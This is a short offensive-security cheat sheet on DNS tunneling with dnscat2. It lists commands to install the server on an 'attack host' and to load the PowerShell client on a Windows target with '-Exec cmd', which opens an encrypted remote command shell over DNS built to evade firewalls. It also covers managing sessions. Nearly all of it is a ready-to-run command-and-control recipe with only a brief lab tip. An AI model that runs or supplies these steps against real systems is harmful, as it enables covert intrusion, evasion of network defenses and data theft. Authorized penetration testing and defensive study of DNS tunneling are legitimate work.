# DNS Tunneling with Dnscat2

DNS tunneling — data rides inside TXT record DNS queries. Evades firewalls that inspect/block HTTPS but allow DNS outbound. Encrypted C2 channel. Most useful when all other outbound traffic is filtered but DNS is allowed.

---

## Server Setup (Attack Host)

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Start the server — note the pre-shared secret in the output:

```bash
sudo ruby dnscat2.rb --dns host=<ATTACK_HOST_IP>,port=53,domain=<DOMAIN> --no-cache
```

---

## Client (Windows Target)

Transfer and import the PowerShell client:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
# transfer dnscat2.ps1 to target
```

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACK_HOST_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```

---

## Interacting with Sessions

```
dnscat2> windows          # list sessions
dnscat2> window -i 1      # interact with session 1
# ctrl-z to background
```

Confirm session shows `ENCRYPTED AND VERIFIED` before using it.

> [!tip] dnscat2 requires your attack host to be the authoritative DNS server for the domain you specify, or you need to point DNS queries at it directly. In lab environments, `--dns server=<IP>,port=53` bypasses the domain requirement.

> [!warning] Running a DNS server on port 53 requires root. Make sure nothing else is listening on UDP/53 on your attack host before starting (`ss -ulnp | grep 53`).